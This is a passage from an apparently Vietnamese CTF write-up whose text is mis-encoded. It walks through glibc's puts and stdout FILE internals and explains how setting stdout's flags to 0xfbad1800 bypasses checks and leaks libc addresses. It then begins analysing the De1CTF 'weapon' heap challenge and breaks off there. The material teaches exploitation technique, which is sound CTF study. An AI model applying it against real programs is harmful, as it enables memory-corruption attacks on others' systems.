</span></span><span class="line"><span class="cl">  <span class="nf">call</span>  <span class="no">puts</span>
</span></span><span class="line"><span class="cl">  <span class="nf">popq</span>  <span class="nv">%rbp</span>
</span></span><span class="line"><span class="cl">  <span class="nf">ret</span>
</span></span></code></pre></div><p>Ti·∫øp theo th√¨ ta s·∫Ω xem h√†m puts l√†m g√¨ ·ªü libc-2.31 (phi√™n b·∫£n m√† m√¨nh ƒëang s·ª≠ d·ª•ng hi·ªán t·∫°i)
Th·ª±c t·∫ø th√¨ codebase c·ªßa glibc r·∫•t l√† r·ªông v√† c√°ch ho·∫°t ƒë·ªông c·ªßa n√≥ n·∫±m ·ªü ph·∫°m v·ªã vƒ© m√¥, v√¨ th·∫ø n√™n r·∫•t kh√≥ ƒë·ªÉ c√≥ th·ªÉ ƒë·ªãnh h∆∞·ªõng ƒë∆∞·ª£c m·ª•c ti√™u m√† m√¨nh c·∫ßn. Khi nh√¨n v√†o codebase ta c√≥ th·ªÉ th·∫•y <code>weak_alias (_IO_puts, puts)</code> ·ªü trong file <code>libio/ioputs.c</code>. ·ªû trong glibc, ƒëi·ªÅu n√†y c√≥ nghƒ©a l√† b·∫•t k·ª≥ ai khi g·ªçi h√†m puts th√¨ th·ª±c t·∫ø thay v√†o ƒë√≥ s·∫Ω g·ªçi IO_puts
H√†m IO_puts nh∆∞ sau</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span>
</span></span><span class="line"><span class="cl"><span class="nf">_IO_puts</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">result</span> <span class="o">=</span> <span class="n">EOF</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">size_t</span> <span class="n">len</span> <span class="o">=</span> <span class="nf">strlen</span> <span class="p">(</span><span class="n">str</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">_IO_acquire_lock</span> <span class="p">(</span><span class="n">_IO_stdout</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">((</span><span class="nf">_IO_vtable_offset</span> <span class="p">(</span><span class="n">_IO_stdout</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">       <span class="o">||</span> <span class="nf">_IO_fwide</span> <span class="p">(</span><span class="n">_IO_stdout</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="o">&amp;&amp;</span> <span class="nf">_IO_sputn</span> <span class="p">(</span><span class="n">_IO_stdout</span><span class="p">,</span> <span class="n">str</span><span class="p">,</span> <span class="n">len</span><span class="p">)</span> <span class="o">==</span> <span class="n">len</span>
</span></span><span class="line"><span class="cl">      <span class="o">&amp;&amp;</span> <span class="nf">_IO_putc_unlocked</span> <span class="p">(</span><span class="sc">&#39;\n&#39;</span><span class="p">,</span> <span class="n">_IO_stdout</span><span class="p">)</span> <span class="o">!=</span> <span class="n">EOF</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="nf">MIN</span> <span class="p">(</span><span class="n">INT_MAX</span><span class="p">,</span> <span class="n">len</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nf">_IO_release_lock</span> <span class="p">(</span><span class="n">_IO_stdout</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>M·ªõ ·ªü tr√™n ch√∫ng ta kh√¥ng c·∫ßn ph·∫£i ƒë·ªÉ √Ω t·∫•t c·∫£ m√† ch·ªâ c·∫ßn focus v√¥ h√†m IO_sputn. H√†m IO_sputn ƒë∆∞·ª£c ƒë·ªãnh nghƒ©a t·∫°i <code>libio/libioP.h, line 374 (as a macro)</code> ƒê√†o s√¢u v√†o trong ta th·∫•y n√≥ l√† 1 n√πi c√°c macro nh√¨n m√† kh√¥ng th·∫•y ƒë∆∞·ªùng ra





  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://i.imgur.com/QYvhPCB.png" alt="" />
    
  </figure>


Sau m·ªôt h·ªìi m·∫Øt m√¨nh ƒë·∫£o nh∆∞ rang l·∫°c th√¨ m√¨nh ƒë√£ t√¨m ra ƒë∆∞·ª£c m·ªôt c√°i function li√™n quan ƒë·∫øn v·∫•n ƒë·ªÅ m√† ch√∫ng ta ƒëang ƒë·ªÅ c·∫≠p, ƒë√≥ ch√≠nh l√† <code>_IO_new_file_xsputn</code> ƒë∆∞·ª£c m√¥ t·∫£ t·∫°i
<code>libio/libioP.h, line 596 (as a prototype)</code> Sau m·ªôt th·ªùi gian m√≤ m·∫´m code c·ªßa h√†m <code>_IO_new_file_xsputn</code> th√¨ cu·ªëi c√πng n√≥ c≈©ng ƒë√£ d·ª´ng l·∫°i t·∫°i h√†m <code>_IO_OVERFLOW</code> ƒë∆∞·ª£c defined t·∫°i <code>libio/libioP.h, line 141 (as a macro)</code>
(L√†m c√°i m·ªõ n√†y m√¨nh c≈©ng ƒëang kh√¥ng bi·∫øt ƒëang l√†m mics hay l√†m pwn n·ªØa &hellip; üòï)
V√† cu·ªëi c√πng th√¨ ƒë√¢y ch√≠nh l√† c√°i m√† ch√∫ng ta ƒëang c·∫ßn t√¨m:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span>
</span></span><span class="line"><span class="cl"><span class="nf">_IO_new_file_overflow</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">f</span><span class="p">,</span> <span class="kt">int</span> <span class="n">ch</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_NO_WRITES</span><span class="p">)</span> <span class="cm">/* SET ERROR */</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">f</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">|=</span> <span class="n">_IO_ERR_SEEN</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="nf">__set_errno</span> <span class="p">(</span><span class="n">EBADF</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="cm">/* If currently reading or no buffer allocated. */</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">((</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_CURRENTLY_PUTTING</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="cm">/* Allocate a buffer if needed. */</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="p">{</span>
</span></span><span class="line"><span class="cl">	  <span class="nf">_IO_doallocbuf</span> <span class="p">(</span><span class="n">f</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	  <span class="nf">_IO_setg</span> <span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">,</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">,</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="nf">__glibc_unlikely</span> <span class="p">(</span><span class="nf">_IO_in_backup</span> <span class="p">(</span><span class="n">f</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">	<span class="p">{</span>
</span></span><span class="line"><span class="cl">	  <span class="kt">size_t</span> <span class="n">nbackup</span> <span class="o">=</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">-</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	  <span class="nf">_IO_free_backup_area</span> <span class="p">(</span><span class="n">f</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	  <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span> <span class="o">-=</span> <span class="nf">MIN</span> <span class="p">(</span><span class="n">nbackup</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">				   <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span> <span class="o">-</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	  <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">=</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">==</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">=</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">=</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">=</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span> <span class="o">=</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_end</span> <span class="o">=</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span> <span class="o">=</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">=</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="n">f</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">|=</span> <span class="n">_IO_CURRENTLY_PUTTING</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_mode</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">_IO_LINE_BUF</span> <span class="o">|</span> <span class="n">_IO_UNBUFFERED</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">	<span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_end</span> <span class="o">=</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">ch</span> <span class="o">==</span> <span class="n">EOF</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">_IO_do_write</span> <span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">			 <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">-</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">==</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span> <span class="p">)</span> <span class="cm">/* Buffer is really full */</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">_IO_do_flush</span> <span class="p">(</span><span class="n">f</span><span class="p">)</span> <span class="o">==</span> <span class="n">EOF</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span><span class="o">++</span> <span class="o">=</span> <span class="n">ch</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">((</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_UNBUFFERED</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="o">||</span> <span class="p">((</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_LINE_BUF</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">ch</span> <span class="o">==</span> <span class="sc">&#39;\n&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">_IO_do_write</span> <span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		      <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">-</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">)</span> <span class="o">==</span> <span class="n">EOF</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="p">)</span> <span class="n">ch</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>ƒê·ªÉ c√≥ th·ªÉ gi·∫£i th√≠ch c√°i h√†m tr√™n th√¨ ch·∫Øc ƒë·∫øn m√πa qu√Ωt m√¨nh m·ªõi gi·∫£i quy·∫øt ƒë∆∞·ª£c v·∫•n ƒë·ªÅ n√†y m·∫•t, ch√∫ng ta h√£y focus v√†o h√†m <code>_IO_do_write</code> th√¨ n√≥ ch√≠nh l√† h√†m cu·ªëi c√πng ƒë∆∞·ª£c g·ªçi v√† <code>_IO_write_base</code> ch√≠nh l√† tham s·ªë cu·ªëi c√πng m√† ch√∫ng ta c·∫ßn modify. ƒê·ªÉ c√≥ th·ªÉ ch·∫°m ƒë∆∞·ª£c ƒë·∫øn h√†m if cu·ªëi c√πng th√¨ ch√∫ng ta c·∫ßn ph·∫£i bypass t·∫•t c·∫£ h√†m if ·ªü tr√™n, ch√∫ng ta kh√¥ng mu·ªën ph·∫£i v∆∞·ªõng v√†o m·ªôt trong c√°c nh√°nh c·ªßa h√†m if ƒë√≥ ƒë√¢u. Quay v·ªÅ b√™n tr√™n c√πng, ch√∫ng ta s·∫Ω bypass t·ª´ng h√†m if m·ªôt.</p>
<ul>
<li>·ªû h√†m if ƒë·∫ßu ti√™n c√°i gi√° tr·ªã <code>f-&gt;flag &amp; _IO_NO_WRITES</code> ph·∫£i l√† 0, ƒë·ªÉ kh√¥ng d√≠nh v√†o b√™n trong h√†m if.</li>
<li>Ti·∫øp theo ch√∫ng ta ph·∫£i set <code>f-&gt;flag &amp; _IO_CURRENTLY_PUTTING</code> b·∫±ng 1 ƒë·ªÉ kh√¥ng v√†o b√™n trong h√†m if th·ª© 2</li>
<li>ƒê√†o s√¢u m·ªôt t√≠ v√†o h√†m <code>_IO_do_write</code> th√¨ ta s·∫Ω th·∫•y m·ªôt h√†m n·ªØa ch·∫°y c√πng v·ªõi h√†m tr√™n ƒë√≥ l√† <code>_IO_new_do_write</code></li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">size_t</span>
</span></span><span class="line"><span class="cl"><span class="nf">new_do_write</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">to_do</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">size_t</span> <span class="n">count</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_IS_APPENDING</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span> <span class="o">=</span> <span class="n">_IO_pos_BAD</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">!=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="kt">off64_t</span> <span class="n">new_pos</span>
</span></span><span class="line"><span class="cl">	<span class="o">=</span> <span class="nf">_IO_SYSSEEK</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">new_pos</span> <span class="o">==</span> <span class="n">_IO_pos_BAD</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span> <span class="o">=</span> <span class="n">new_pos</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="n">count</span> <span class="o">=</span> <span class="nf">_IO_SYSWRITE</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">to_do</span><span class="p">);</span> <span class="c1">//our aim
</span></span></span><span class="line"><span class="cl"><span class="c1"></span> <span class="p">...</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">count</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>V√† ƒë√¢y ch√≠nh l√† m·ª•c ti√™u cu·ªëi c√πng c·ªßa ch√∫ng ta (ho·∫∑c th·ª© g√¨ ƒë√≥ x√™m x√™m) <code>_IO_SYSWRITE (fp, data, to_do)</code> Sau khi l∆∞·ª£c qua c√°c h√†m if th√¨ ƒë·ªÉ c√≥ th·ªÉ bypass t·∫•t c·∫£ c√°c h√†m if tr√™n l√† b·∫•t kh·∫£ thi(nhi·ªÅu l√≠ do kh√≥ c√≥ th·ªÉ m√† khai th√°c ƒë∆∞·ª£c, c√≥ m·ªôt c√°i v·∫•n ƒë·ªÅ m√† ch√∫ng ta kh√¥ng th·ªÉ control n√≥ ƒë∆∞·ª£c ƒë√≥ l√† <code>fp-&gt;_IO_write_base - fp-&gt;_IO_read_end</code>. N·∫øu nh∆∞ ch√∫ng ta set <code>fp-&gt;_IO_read_end</code> th√†nh 0, d·∫´n t·ªõi h·∫≠u qu·∫£ l√† tham s·ªë th·ª© 2 s·∫Ω qu√° d√†i, v√† n·∫øu ta set <code>fp-&gt;_IO_write_base &gt; fp-&gt;_IO_read_end</code> th√¨ ch√∫ng ta s·∫Ω d√≠nh l·ªói ·ªü 1 ch·ªó kh√°c, t·∫°i v√¨ <code>_IO_write_base</code> s·∫Ω tr·ªü n√™n l·ªõn h∆°n <code>_IO_write_ptr</code> m√† c√°i ta c·∫ßn l√† <code>_IO_write_base</code> ph·∫£i nh·ªè h∆°n <code>_IO_write_ptr</code>), d∆∞·ªùng nh∆∞ ch√∫ng ta ch·ªâ c√≥ l·ª±a ch·ªçn skip qua h√†m else if, ƒë·ªÉ hi·ªán th·ª±c h√≥a ƒëi·ªÅu n√†y th√¨  ta c·∫ßn focus v√†o<code>fp-&gt;_IO_write_base</code> v√† <code>fp-&gt;_IO_read_end</code>, d·ª±a v√†o source code tr√™n th√¨ ta c√≥ th·ªÉ suy ra ƒë∆∞·ª£c ƒë√≥ l√† ta ph·∫£i set <code>fp-&gt;flags &amp; _IO_is_appending</code></p>


<h3 class="relative group">Inconclusion 
    <div id="inconclusion" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#inconclusion" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p><code>_IO_file</code> ƒë∆∞·ª£c bao g·ªìm trong <code>_IO_FILE_plus</code> c√≥ c·∫•u tr√∫c nh∆∞ b√™n d∆∞·ªõi:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">_IO_FILE_plus</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">_IO_FILE</span> <span class="n">file</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="k">struct</span> <span class="n">_IO_jump_t</span> <span class="o">*</span><span class="n">vtable</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span></code></pre></div><p>




  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://i.imgur.com/s7xIJqW.png" alt="" />
    
  </figure>


<code>_IO_FILE</code> ƒë∆∞·ª£c ƒë·ªãnh nghƒ©a d∆∞·ªõi d·∫°ng linked list, ƒë·∫ßu node c·ªßa list tr√™n l√† <code>_IO_list_all</code>. T√≥m t·∫Øt s∆° qua th√¨ <code>IO_list_all</code> s·∫Ω tr·ªè ƒë·∫øn <code>stderr</code> (file descriptor l√† 2) ti·∫øp theo s·∫Ω tr·ªè ƒë·∫øn <code>stdout</code>(file descriptor l√† 1) v√† cu·ªëi c√πng tr·ªè ƒë·∫øn stdin(file descriptor l√† 0).
D∆∞·ªõi ƒë√¢y l√† nh·ªØng gi√° tr·ªã c·∫ßn thi·∫øt cho vi·ªác bypass to√†n b·ªô nh·ªØng h√†m if ·ªü b√™n tr√™n v√† ƒë·∫°t ƒë·∫øn m·ª•c ti√™u cu·ªëi c√πng.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">_flags</span> <span class="o">=</span> <span class="mh">0xfbad0000</span> <span class="c1">//magic number
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">_flags</span> <span class="o">&amp;=</span> <span class="n">_IO_NO_WRITE</span> <span class="c1">//flag = 0xfbad0000
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">_flag</span> <span class="o">|=</span> <span class="n">_IO_CURRENTLY_PUTTING</span> <span class="c1">//flag = 0xfbad0800
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">_flag</span> <span class="o">|=</span> <span class="n">_IO_IS_APPENDING</span> <span class="c1">//flag = 0xfbad1800
</span></span></span></code></pre></div><p><em>V·∫≠y t·∫•t c·∫£ nh·ªØng g√¨ ch√∫ng ta c·∫ßn l√†m ƒë√≥ ch√≠nh l√† set <code>stdout-&gt;flags</code> th√†nh 0xfbad1800 v√† ƒë·ªÉ leak m√† th·ª© ch√∫ng ta c·∫ßn th√¨ ch√∫ng ta ph·∫£i t√≠nh to√°n offset c·ª• th·ªÉ ƒë·ªÉ c√≥ th·ªÉ ghi ƒë√®, c·ª• th·ªÉ ·ªü ƒë√¢y ƒë√≥ ch√≠nh l√† c√°i ch·ª©c nƒÉng m√† ta output v√≠ d·ª• nh∆∞ l√† puts ch·∫≥ng h·∫°n ph·∫£i d·ª±a v√†o k·∫øt qu·∫£ c·ªßa <code>IO_write_ptr - IO_write_base</code></em></p>
<hr>
<p>TrƒÉm nghe th√¨ kh√¥ng b·∫±ng m·ªôt th·∫•y, ·ªü d∆∞·ªõi m√¨nh demo technique tr√™n b·∫±ng c√¢u weapon c·ªßa gi·∫£i De1CTF</p>


<h2 class="relative group">Weapon 
    <div id="weapon" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#weapon" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<hr>


<h3 class="relative group">Analyze 
    <div id="analyze" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#analyze" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>Nh∆∞ m·ªôt th√≥i quen th√¨ m·ªçi challenge pwn th√¨ m√¨nh s·∫Ω lu√¥n check file, checksec, check c√°c l·ªói c∆° b·∫£n, v&hellip;v..





  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://i.imgur.com/hZJyPLt.png" alt="" />
    
  </figure>

</p>
<p>Nh√¨n v√†o th√¨ ƒë·ªÅ b√†i cho m·ªôt file ELF 64-bit, b·ªã stripped v√† full mitigation (full ƒë·ªì full gi√°p &hellip;.)





  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://i.imgur.com/geNstgd.png" alt="" />
    
  </figure>


&ldquo;<em>L√† m·ªôt th·∫±ng ƒë√†n √¥ng th√¨ kh√¥ng ch√πn b∆∞·ªõc tr∆∞·ªõc m·ªçi th·ª≠ th√°ch</em>&rdquo;</p>
<p>




  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://i.imgur.com/Ky5hu8F.png" alt="" />
    
  </figure>

</p>
<p>ƒê·ªÅ cho ta 1 v√≤ng l·∫∑p, trong ƒë√≥ c√≥ 3 function c∆° b·∫£n c·ªßa 1 b√†i heap: Create, delete v√† kh√¥ng ƒë∆∞·ª£c cung c·∫•p h√†m in ƒë·ªÉ tr√°nh leak libc address ho·∫∑c nh·ªØng address quan tr·ªçng, b√π l·∫°i ta ƒë∆∞·ª£c h√†m rename m·ªôt weapon(ch·∫Øc ch·∫Øn s·∫Ω c√≥ √≠ch trong l∆∞∆°ng lai)</p>
<ul>
<li>H√†m Create: ƒê∆°n gi·∫£n ch·ªâ l√† nh·∫≠p size c·ªßa m·ªôt chunk, index v√† data c·ªßa chunk ƒë√≥ th√¥ng qua bi·∫øn name.</li>
<li>H√†m Delete: T∆∞∆°ng t·ª± nh∆∞ m·ªçi ƒë·ªÅ heap kh√°c, ch·ªâ ƒë·ªãnh free m·ªôt chunk ƒë√£ c√≥ s·∫µn th√¥ng qua bi·∫øn index</li>
<li>H√†m rename: Thay ƒë·ªïi n·ªôi dung c·ªßa m·ªôt chunk ch·ªâ ƒë·ªãnh th√¥ng qua bi·∫øn index.</li>
</ul>
<p>Nh√¨n k·ªπ h∆°n b·∫±ng ida(m√¨nh ƒë√£ thay ƒë·ªïi t√™n bi·∫øn v√† m·ªôt s·ªë t√™n h√†m ƒë·ªÉ nh√¨n hi·ªÉu r√µ h∆°n)</p>
<ul>
<li>
<p>H√†m main nh∆∞ m√¨nh ƒë√£ n√≥i ·ªü tr√™n ‚¨ÜÔ∏è





  <figure>
